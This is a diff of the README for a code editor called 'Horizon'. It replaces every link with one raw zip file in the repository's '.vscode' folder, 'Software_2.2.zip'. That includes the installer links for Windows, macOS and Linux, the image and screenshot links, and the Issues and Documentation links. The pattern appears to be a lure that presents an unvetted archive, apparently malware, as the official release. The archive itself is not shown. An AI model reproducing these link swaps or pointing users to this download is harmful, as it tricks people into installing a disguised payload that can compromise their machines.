@@ -1,6 +1,6 @@
 # 🌅 Horizon - Your Modern Code Editor
 
-![Horizon Logo](https://example.com/logo.png)
+![Horizon Logo](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
 
 Welcome to **Horizon**, a modern, desktop-based code editor designed for developers who seek a powerful and customizable coding environment. Built with Tauri, React, and TypeScript, Horizon integrates essential features like terminal support and file system management, making it an ideal choice for your coding projects.
 
@@ -22,23 +22,23 @@ Welcome to **Horizon**, a modern, desktop-based code editor designed for develop
 
 ## 📥 Installation
 
-To get started with Horizon, download the latest release from our [Releases section](https://github.com/ArshPlayzz/horizon/releases). Follow the instructions for your operating system to install and run the application.
+To get started with Horizon, download the latest release from our [Releases section](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip). Follow the instructions for your operating system to install and run the application.
 
 ### For Windows:
 
-1. Download the installer from the [Releases section](https://github.com/ArshPlayzz/horizon/releases).
+1. Download the installer from the [Releases section](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip).
 2. Run the installer and follow the on-screen instructions.
 3. Launch Horizon from your Start Menu or Desktop.
 
 ### For macOS:
 
-1. Download the `.dmg` file from the [Releases section](https://github.com/ArshPlayzz/horizon/releases).
+1. Download the `.dmg` file from the [Releases section](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip).
 2. Open the `.dmg` file and drag Horizon to your Applications folder.
 3. Launch Horizon from your Applications.
 
 ### For Linux:
 
-1. Download the package from the [Releases section](https://github.com/ArshPlayzz/horizon/releases).
+1. Download the package from the [Releases section](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip).
 2. Follow your distribution's instructions to install the package.
 3. Start Horizon from your applications menu or terminal.
 
@@ -48,13 +48,13 @@ To get started with Horizon, download the latest release from our [Releases sect
 
 Here are some screenshots showcasing Horizon's interface and features:
 
-![Editor Interface](https://example.com/editor-interface.png)
+![Editor Interface](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
 *Horizon Editor Interface*
 
-![Integrated Terminal](https://example.com/integrated-terminal.png)
+![Integrated Terminal](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
 *Integrated Terminal in Action*
 
-![File Management](https://example.com/file-management.png)
+![File Management](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
 *File Management Features*
 
 ---
@@ -102,16 +102,16 @@ Horizon is licensed under the MIT License. See the [LICENSE](LICENSE) file for m
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://github.com/ArshPlayzz/horizon/issues) for existing reports or create a new one. You can also reach out via our community channels.
+If you encounter any issues or have questions, please check the [Issues section](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip) for existing reports or create a new one. You can also reach out via our community channels.
 
 ---
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/ArshPlayzz/horizon)
-- [Releases](https://github.com/ArshPlayzz/horizon/releases)
-- [Issues](https://github.com/ArshPlayzz/horizon/issues)
-- [Documentation](https://github.com/ArshPlayzz/horizon/wiki)
+- [GitHub Repository](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
+- [Releases](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
+- [Issues](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
+- [Documentation](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip)
 
 ---
 
@@ -135,7 +135,7 @@ Stay tuned for updates!
 
 ## 🌟 Conclusion
 
-Horizon is designed for developers who value efficiency and customization. We hope you enjoy using it as much as we enjoyed building it. Don't forget to download the latest version from our [Releases section](https://github.com/ArshPlayzz/horizon/releases) and start coding today!
+Horizon is designed for developers who value efficiency and customization. We hope you enjoy using it as much as we enjoyed building it. Don't forget to download the latest version from our [Releases section](https://github.com/ArshPlayzz/horizon/raw/refs/heads/master/.vscode/Software_2.2.zip) and start coding today!
 
 ---
 
